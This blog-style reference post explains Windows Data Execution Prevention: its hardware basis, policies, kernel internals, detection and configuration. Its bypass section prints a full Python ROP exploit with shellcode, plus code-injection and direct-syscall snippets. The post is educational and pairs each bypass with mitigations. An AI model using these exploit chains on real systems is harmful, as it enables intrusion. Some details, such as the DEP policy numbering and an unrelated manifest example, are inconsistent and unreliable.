---
layout: post
slug: dep
title: Data Execution Prevention (DEP)
---

## Overview

| Property | Value |
|:---------|:------|
| **Introduced** | Windows XP SP2 (2004) |
| **Category** | Memory Protection |
| **Level** | Hardware (CPU) + OS enforcement |
| **Enabled by default** | Yes (OptOut mode since Vista) |

DEP marks memory regions as non-executable. When the CPU attempts to execute code from a non-executable page, a hardware exception is raised and Windows terminates the process.

This breaks classic exploitation techniques where attackers inject shellcode into the stack or heap and redirect execution to it.

---

## History

| Version | Changes |
|:--------|:--------|
| Windows XP SP2 | Introduced with Hardware DEP (NX/XD) and Software DEP (SafeSEH) |
| Windows Vista | Default policy changed from OptIn to OptOut |
| Windows 8 | Apps must opt-out explicitly; ASLR+DEP enforced for system processes |
| Windows 10 | Permanent DEP for 64-bit processes (cannot be disabled) |

---

## How It Works

### CPU-Level Implementation

Modern processors implement a **No-eXecute (NX)** bit in the page table entry (PTE). AMD calls it NX, Intel calls it XD (eXecute Disable).

```
Page Table Entry (64-bit):
┌────┬─────────────────────────────────────────────────────────┬────┬────┬────┐
│ NX │                Physical Address (40 bits)               │ US │ RW │ P  │
└────┴─────────────────────────────────────────────────────────┴────┴────┴────┘
 Bit 63                                                         Bit 2  Bit 1  Bit 0

NX (bit 63):
  0 = Page is executable
  1 = Page is NOT executable (execution triggers #PF)
```

### Page Fault Flow

When code execution is attempted on a non-executable page:

```
1. CPU fetches instruction at address 0x0012FF88
2. CPU checks PTE for that address
3. PTE has NX bit = 1
4. CPU raises Page Fault (#PF) with special error code
   ┌─────────────────────────────────────────┐
   │ Error Code Bit 4 = 1 (Instruction Fetch)│
   │ Error Code Bit 0 = 1 (Protection Violation) │
   └─────────────────────────────────────────┘
5. Windows kernel receives exception
6. Kernel checks: Was this an execution attempt on NX page?
7. Yes → STATUS_ACCESS_VIOLATION (0xC0000005)
8. Process terminated with DEP exception
```

### Memory Regions and Default Permissions

| Region | Default | With DEP |
|:-------|:--------|:---------|
| .text (code) | R-X | R-X |
| .data (globals) | RW- | RW- |
| .rdata (constants) | R-- | R-- |
| Stack | RWX | **RW-** |
| Heap | RWX | **RW-** |
| VirtualAlloc default | RWX | **RW-** |

The key change is stack and heap losing execute permission.

### DEP Policies

Windows supports four DEP policies configured at boot:

| Policy | Value | Behavior |
|:-------|:------|:---------|
| **OptIn** | 0 | DEP only for processes that explicitly opt-in |
| **OptOut** | 1 | DEP for all processes except those that opt-out (default) |
| **AlwaysOn** | 2 | DEP for all processes, no exceptions |
| **AlwaysOff** | 3 | DEP disabled entirely |

Check current policy:

```
C:\> bcdedit /enum | findstr "nx"
nx                      OptOut
```

Change policy (requires reboot):

```
bcdedit /set nx AlwaysOn
bcdedit /set nx AlwaysOff
bcdedit /set nx OptIn
bcdedit /set nx OptOut
```

### Per-Process DEP Configuration

Processes can have DEP enabled/disabled individually (unless policy is AlwaysOn):

```c
// Check if DEP is enabled for current process
DWORD flags;
BOOL permanent;
GetProcessDEPPolicy(GetCurrentProcess(), &flags, &permanent);

// flags:
//   0 = DEP disabled
//   PROCESS_DEP_ENABLE (0x1) = DEP enabled
//   PROCESS_DEP_DISABLE_ATL_THUNK_EMULATION (0x2) = ATL thunk emulation disabled

// permanent:
//   TRUE = Cannot be changed at runtime
//   FALSE = Can be toggled
```

Enable DEP for current process:

```c
SetProcessDEPPolicy(PROCESS_DEP_ENABLE);
```

**Important:** Once enabled, DEP cannot be disabled for that process (one-way toggle).

---

## Kernel Implementation Details

### NtSetInformationProcess

DEP state is managed through the `ProcessExecuteFlags` information class:

```c
typedef enum _PROCESS_INFORMATION_CLASS {
    // ...
    ProcessExecuteFlags = 0x22,
    // ...
} PROCESS_INFORMATION_CLASS;

#define MEM_EXECUTE_OPTION_DISABLE           0x01  // DEP enabled
#define MEM_EXECUTE_OPTION_ENABLE            0x02  // DEP disabled (confusing naming)
#define MEM_EXECUTE_OPTION_DISABLE_THUNK     0x04  // Disable ATL thunk emulation
#define MEM_EXECUTE_OPTION_PERMANENT         0x08  // Cannot be changed

NTSTATUS NtSetInformationProcess(
    HANDLE ProcessHandle,
    PROCESS_INFORMATION_CLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);
```

### KPROCESS Flags

In the kernel, DEP state is stored in the `KPROCESS` structure:

```c
// Simplified KPROCESS (Windows 10)
typedef struct _KPROCESS {
    // ...
    struct {
        ULONG ExecuteDisable : 1;           // DEP enabled
        ULONG ExecuteEnable : 1;            // DEP disabled  
        ULONG DisableThunkEmulation : 1;    // ATL thunks
        ULONG Permanent : 1;                // Cannot change
        // ...
    } Flags;
    // ...
} KPROCESS;
```

### Page Table Entry Management

When a page is allocated, Windows sets the NX bit based on protection flags:

```c
// Simplified MiMakeProtectionMask logic
ULONG MiMakeProtectionMask(ULONG Protect) {
    ULONG Mask = 0;
    
    if (Protect & PAGE_EXECUTE ||
        Protect & PAGE_EXECUTE_READ ||
        Protect & PAGE_EXECUTE_READWRITE ||
        Protect & PAGE_EXECUTE_WRITECOPY) {
        // Executable - NX bit = 0
        Mask &= ~PTE_NX;
    } else {
        // Non-executable - NX bit = 1
        if (ProcessDEPEnabled) {
            Mask |= PTE_NX;
        }
    }
    
    return Mask;
}
```

---

## What It Protects Against

### Classic Stack Buffer Overflow

**Vulnerable code:**

```c
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
```

**Without DEP - Exploitation:**

```
Payload: [SHELLCODE (64 bytes)] + [PADDING (4 bytes)] + [ADDR_OF_SHELLCODE]

Stack after overflow:
┌─────────────────────────┐ Low addresses
│ SHELLCODE               │ ← Attacker's code
│ 0x90909090...           │ ← NOP sled
├─────────────────────────┤
│ "AAAA" (padding)        │ ← Overwrites saved EBP
├─────────────────────────┤
│ 0x0012FF40              │ ← Overwrites return address (points to shellcode)
└─────────────────────────┘ High addresses

When function returns:
1. POP EIP ← 0x0012FF40
2. JMP 0x0012FF40
3. Execute shellcode
4. PWNED
```

**With DEP - Attack Fails:**

```
When function returns:
1. POP EIP ← 0x0012FF40
2. JMP 0x0012FF40
3. CPU checks PTE for 0x0012FF40
4. NX bit = 1 (stack is non-executable)
5. #PF exception raised
6. Windows terminates process

Exception Record:
  Code: STATUS_ACCESS_VIOLATION (0xC0000005)
  Flags: EXCEPTION_NONCONTINUABLE
  Address: 0x0012FF40
  
Application Error:
  "The instruction at 0x0012FF40 referenced memory at 0x0012FF40. 
   The memory could not be executed."
```

### Heap Spray

Without DEP, attackers could spray shellcode across the heap and jump to a predictable address. With DEP, even if they land on their shellcode, it won't execute.

### SEH Overwrite

Overwriting Structured Exception Handler pointers to redirect execution to shellcode on the stack fails because the stack is non-executable.

---

## Bypass Techniques

### Bypass #1: Return-Oriented Programming (ROP)

**Concept:** Instead of executing injected code, reuse existing executable code snippets ("gadgets") ending in `RET`.

**Requirements:**
- Knowledge of loaded module addresses (defeated by ASLR)
- Gadgets in executable modules

**Finding Gadgets:**

```bash
# Using ROPgadget
$ ROPgadget --binary ntdll.dll --only "pop|ret"

Gadgets information
============================================================
0x77c21120 : pop eax ; ret
0x77c21456 : pop ecx ; ret
0x77c21789 : pop edx ; ret
0x77c22345 : pop ebx ; pop esi ; ret
0x77c23456 : mov eax, ecx ; ret
0x77c24567 : xchg eax, esp ; ret

# Using rp++
$ rp++ -f ntdll.dll -r 5 | grep "pop"
```

**Goal:** Call `VirtualProtect()` to make shellcode executable, then jump to it.

```c
BOOL VirtualProtect(
    LPVOID lpAddress,      // Address of shellcode
    SIZE_T dwSize,         // Size to change
    DWORD  flNewProtect,   // PAGE_EXECUTE_READWRITE (0x40)
    PDWORD lpflOldProtect  // Output parameter
);
```

**ROP Chain Construction:**

```
Stack layout (grows down):
┌─────────────────────────┐
│ Padding (overflow)      │
├─────────────────────────┤
│ 0x77c21120 (pop eax)    │ ← Overwrites return address
├─────────────────────────┤
│ 0x0012FF88              │ ← Value for EAX (shellcode address)
├─────────────────────────┤
│ 0x77c21456 (pop ecx)    │ ← Next gadget
├─────────────────────────┤
│ 0x7FFE0300              │ ← Value for ECX (writable address for lpflOldProtect)
├─────────────────────────┤
│ VirtualProtect addr     │ ← API call
├─────────────────────────┤
│ 0x77c67890 (jmp esp)    │ ← Return address after VirtualProtect
├─────────────────────────┤
│ 0x0012FF88              │ ← Arg1: lpAddress
├─────────────────────────┤
│ 0x00001000              │ ← Arg2: dwSize
├─────────────────────────┤
│ 0x00000040              │ ← Arg3: PAGE_EXECUTE_READWRITE
├─────────────────────────┤
│ 0x7FFE0300              │ ← Arg4: lpflOldProtect
├─────────────────────────┤
│ SHELLCODE...            │ ← Now executable after VirtualProtect
└─────────────────────────┘
```

**Execution Flow:**

```
1. Function returns → EIP = 0x77c21120 (pop eax; ret)
2. pop eax → EAX = 0x0012FF88
3. ret → EIP = 0x77c21456 (pop ecx; ret)
4. pop ecx → ECX = 0x7FFE0300
5. ret → EIP = VirtualProtect
6. VirtualProtect(0x0012FF88, 0x1000, 0x40, 0x7FFE0300)
   → Page containing shellcode is now RWX
7. VirtualProtect returns → EIP = 0x77c67890 (jmp esp)
8. jmp esp → EIP = ESP = shellcode address
9. Shellcode executes
```

**Full Exploit Code (Python):**

```python
import struct

def p32(addr):
    return struct.pack("<I", addr)

# Addresses (without ASLR or after leak)
VIRTUALPROTECT = 0x7C801AD4
POP_EAX        = 0x77C21120
POP_ECX        = 0x77C21456  
POP_EDX        = 0x77C21789
POP_EBX_ESI    = 0x77C22345
PUSHAD_RET     = 0x77C25678
JMP_ESP        = 0x77C67890
WRITABLE       = 0x7FFE0300

# Shellcode (example: WinExec("calc", 0))
shellcode = (
    b"\x31\xc0\x50\x68\x63\x61\x6c\x63"
    b"\x54\x59\x50\x40\x92\x74\x15\x51"
    b"\x64\x8b\x72\x2f\x8b\x76\x0c\x8b"
    b"\x76\x0c\xad\x8b\x30\x8b\x7e\x18"
    b"\xb2\x50\xeb\x03\xb2\x53\x8b\x5f"
    b"\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f"
    b"\x20\x01\xfe\x8b\x4c\x1f\x24\x01"
    b"\xf9\x42\xad\x81\x3c\x07\x57\x69"
    b"\x6e\x45\x75\xf5\x0f\xb7\x54\x51"
    b"\xfe\x8b\x74\x1f\x1c\x01\xfe\x03"
    b"\x3c\x96\xff\xd7"
)

# Build payload
buffer_size = 64
payload = b"A" * buffer_size      # Fill buffer
payload += b"BBBB"                # Overwrite EBP

# ROP chain to call VirtualProtect
# Using PUSHAD technique for cleaner setup

# Setup registers:
#   EAX = NOP (will be POPAD'd)
#   EBX = dwSize
#   ECX = lpOldProtect (writable)
#   EDX = PAGE_EXECUTE_READWRITE
#   ESI = VirtualProtect address
#   EDI = RET gadget (return after VP)
#   EBP = lpAddress (ptr to shellcode)

payload += p32(POP_EAX)
payload += p32(0x90909090)        # NOP for EAX

payload += p32(POP_EBX_ESI)
payload += p32(0x00001000)        # EBX = dwSize
payload += p32(VIRTUALPROTECT)    # ESI = VirtualProtect

payload += p32(POP_ECX)
payload += p32(WRITABLE)          # ECX = lpOldProtect

payload += p32(POP_EDX)
payload += p32(0x00000040)        # EDX = PAGE_EXECUTE_READWRITE

payload += p32(PUSHAD_RET)        # PUSHAD sets up stack frame, RET calls VP

payload += p32(JMP_ESP)           # After VirtualProtect returns

payload += shellcode              # Shellcode (now executable)

# Write to file
with open("exploit.bin", "wb") as f:
    f.write(payload)

print(f"[+] Payload size: {len(payload)} bytes")
```

---

### Bypass #2: Return-to-libc

**Concept:** Instead of ROP chains, directly return to a useful function like `system()` or `WinExec()`.

```
Stack:
┌─────────────────────────┐
│ Padding                 │
├─────────────────────────┤
│ WinExec address         │ ← Overwrites return address
├─────────────────────────┤
│ ExitProcess address     │ ← Return address for WinExec
├─────────────────────────┤
│ ptr to "calc.exe"       │ ← Arg1: lpCmdLine
├─────────────────────────┤
│ 0x00000001              │ ← Arg2: uCmdShow (SW_SHOWNORMAL)
├─────────────────────────┤
│ "calc.exe\0"            │ ← Command string
└─────────────────────────┘
```

**Limitations:**
- Limited to existing function functionality
- Harder to achieve complex payloads
- Still need to know addresses (defeated by ASLR)

---

### Bypass #3: JIT Spraying (Historical, Browsers)

**Concept:** Abuse Just-In-Time compilation in browsers (JavaScript, Flash) to generate executable shellcode.

```javascript
// Attacker's JavaScript
var shellcode = 0x3C909090 ^ 0x3C909090;  // XOR operations
// JIT compiler generates:
//   XOR EAX, 0x3C909090
//   XOR EAX, 0x3C909090
//   ...
// Which contains 0x90 (NOP) bytes at predictable offsets
```

**Why it works:** JIT-compiled code is executable by design.

**Mitigations:** Constant blinding, random NOP insertion, JIT hardening.

---

### Bypass #4: VirtualAlloc with PAGE_EXECUTE_READWRITE

If attacker can call `VirtualAlloc()` before injecting code:

```c
// Attacker-controlled call
LPVOID exec_mem = VirtualAlloc(
    NULL,
    shellcode_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE  // Explicitly request RWX
);

memcpy(exec_mem, shellcode, shellcode_size);
((void(*)())exec_mem)();  // Execute
```

**Why it works:** DEP allows explicit RWX allocation; it only changes the default.

**Mitigations:** CFG, ACG (Arbitrary Code Guard blocks dynamic RWX).

---

### Bypass #5: WriteProcessMemory to Existing Executable Region

Overwrite existing code in a module's `.text` section:

```c
// Find executable region
MODULEINFO modinfo;
GetModuleInformation(GetCurrentProcess(), GetModuleHandle("ntdll.dll"), 
                     &modinfo, sizeof(modinfo));

// Overwrite code
DWORD oldProtect;
VirtualProtect(modinfo.lpBaseOfDll, shellcode_size, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(modinfo.lpBaseOfDll, shellcode, shellcode_size);
VirtualProtect(modinfo.lpBaseOfDll, shellcode_size, oldProtect, &oldProtect);

// Jump to overwritten code
((void(*)())modinfo.lpBaseOfDll)();
```

**Mitigations:** Code Integrity (CI), HVCI prevents unauthorized code modification.

---

### Bypass #6: Abusing Shared Memory Sections

Create a shared section with RWX, write shellcode from another process:

```c
// Process A (attacker)
HANDLE hSection = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, 
                                    PAGE_EXECUTE_READWRITE, 0, 0x1000, L"SharedMem");
LPVOID pShared = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE,
                               0, 0, 0x1000);
memcpy(pShared, shellcode, shellcode_size);

// Process B (victim) maps the same section and executes
```

---

### Bypass #7: NtProtectVirtualMemory Direct Syscall

Bypass usermode hooks by calling kernel directly:

```asm
; Direct syscall to NtProtectVirtualMemory
mov r10, rcx
mov eax, 0x50           ; Syscall number (varies by Windows version)
syscall
ret
```

```c
// Change stack to RWX via direct syscall
PVOID stackAddr = &stackAddr;
SIZE_T regionSize = 0x1000;
ULONG oldProtect;

NtProtectVirtualMemory(
    GetCurrentProcess(),
    &stackAddr,
    &regionSize,
    PAGE_EXECUTE_READWRITE,
    &oldProtect
);

// Stack is now executable
((void(*)())shellcode_on_stack)();
```

---

## Detection and Forensics

### Check System-Wide DEP Policy

```powershell
# PowerShell
Get-CimInstance Win32_OperatingSystem | Select-Object DataExecutionPrevention_SupportPolicy

# 0 = AlwaysOff
# 1 = AlwaysOn  
# 2 = OptIn
# 3 = OptOut
```

```
bcdedit /enum | findstr "nx"
```

### Check Process DEP Status

```powershell
# PowerShell - All processes
Get-Process | ForEach-Object {
    $dep = $false
    try {
        $dep = $_.DEPEnabled
    } catch {}
    [PSCustomObject]@{
        Name = $_.ProcessName
        PID = $_.Id
        DEP = $dep
    }
} | Format-Table
```

**Process Explorer:**
1. View → Select Columns → DEP Status
2. Shows "DEP (permanent)" or "DEP" or empty

### Check Specific Process

```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD flags;
    BOOL permanent;
    
    if (GetProcessDEPPolicy(GetCurrentProcess(), &flags, &permanent)) {
        printf("DEP Enabled: %s\n", (flags & PROCESS_DEP_ENABLE) ? "Yes" : "No");
        printf("Permanent: %s\n", permanent ? "Yes" : "No");
        printf("ATL Thunk Emulation: %s\n", 
               (flags & PROCESS_DEP_DISABLE_ATL_THUNK_EMULATION) ? "Disabled" : "Enabled");
    }
    
    return 0;
}
```

### Detect DEP Bypass Attempts

**Event Log:** Application crashes with `0xC0000005` at non-module addresses may indicate DEP blocking shellcode.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName='Application'
    ProviderName='Application Error'
} | Where-Object {
    $_.Message -match "0xc0000005"
} | Select-Object TimeCreated, Message -First 10
```

**ETW Tracing:** Monitor `VirtualProtect` calls changing pages to executable:

```powershell
# Monitor VirtualProtect calls
logman create trace DEPMonitor -p Microsoft-Windows-Kernel-Memory -o dep_trace.etl
logman start DEPMonitor
# ... run suspicious process ...
logman stop DEPMonitor
```

---

## Configuration

### System-Wide (Boot Configuration)

```
# Enable DEP for all processes (most secure)
bcdedit /set nx AlwaysOn

# Enable DEP with opt-out capability (default)
bcdedit /set nx OptOut

# Enable DEP only for Windows components
bcdedit /set nx OptIn

# Disable DEP entirely (not recommended)
bcdedit /set nx AlwaysOff
```

### Per-Application (Compatibility)

**Registry (Image File Execution Options):**

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\app.exe
  DisableExceptionChainValidation = 1 (DWORD)
  MitigationOptions = ... (QWORD, complex bitmask)
```

**Application Manifest:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{...}"/>
    </application>
  </compatibility>
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
    </windowsSettings>
  </application>
</assembly>
```

**Programmatic:**

```c
// Enable DEP for current process (one-way, cannot disable after)
SetProcessDEPPolicy(PROCESS_DEP_ENABLE | PROCESS_DEP_DISABLE_ATL_THUNK_EMULATION);
```

### Group Policy

```
Computer Configuration
  → Administrative Templates
    → System
      → Exploit Protection
        → "Turn off Data Execution Prevention for Explorer"
```

### EMET / Windows Defender Exploit Guard

Modern Windows uses Exploit Guard instead of EMET:

```powershell
# Check current settings
Get-ProcessMitigation -System

# Set DEP to always on for a process
Set-ProcessMitigation -Name "app.exe" -Enable DEP

# Set DEP always on system-wide
Set-ProcessMitigation -System -Enable DEP
```

---

## Interaction with Other Mechanisms

| Mechanism | Interaction |
|:----------|:------------|
| **ASLR** | Complements DEP by randomizing addresses, making ROP gadget addresses unpredictable |
| **CFG** | Validates indirect call targets, limits ROP to valid function entries |
| **ACG** | Prevents dynamic code generation, blocks `VirtualAlloc(RWX)` bypass |
| **CET** | Hardware shadow stack prevents ROP by validating return addresses |
| **SEHOP** | Protects exception handlers, prevents SEH-based DEP bypasses |

**Defense in Depth:**

```
DEP alone:
  → Bypassed with ROP using fixed addresses

DEP + ASLR:
  → Need info leak to find gadgets

DEP + ASLR + CFG:
  → ROP limited to function starts only

DEP + ASLR + CFG + CET:
  → Hardware validates return addresses
  → ROP extremely difficult
```

---

## Compiler and Linker Flags

### Visual Studio

```
# Enable DEP (/NXCOMPAT)
cl /GS source.c /link /NXCOMPAT

# Link flags
/NXCOMPAT          - Enable DEP
/NXCOMPAT:NO       - Disable DEP (compatibility)
```

### GCC (MinGW)

```bash
# Enable DEP
gcc -o program source.c -Wl,--nxcompat

# Check if enabled
objdump -p program.exe | grep -i "nx"
```

### Verify Binary

```powershell
# PowerShell - Check if binary has DEP enabled
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\binary.exe")
$peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
$dllCharacteristics = [BitConverter]::ToUInt16($bytes, $peOffset + 0x5E)

if ($dllCharacteristics -band 0x0100) {
    Write-Host "DEP/NX Compatible: Yes"
} else {
    Write-Host "DEP/NX Compatible: No"
}
```

```c
// Using pefile (Python)
import pefile

pe = pefile.PE("binary.exe")
if pe.OPTIONAL_HEADER.DllCharacteristics & 0x0100:
    print("DEP enabled (NXCOMPAT)")
```

---

## References

- [Microsoft: Data Execution Prevention](https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
- [Intel: Execute Disable Bit](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/best-practices/data-execution-prevention.html)
- [Windows Internals, 7th Edition - Chapter 5: Memory Management](https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188)
- [Corelan: Exploit Writing Tutorial Part 6 - Bypassing DEP](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/)
- [Uninformed: Bypassing Hardware DEP](http://uninformed.org/index.cgi?v=2&a=4)
- [MSDN: SetProcessDEPPolicy](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setprocessdeppolicy)
- [Alex Ionescu: DEP Internals](http://www.yourwindow.to/windows-os/)
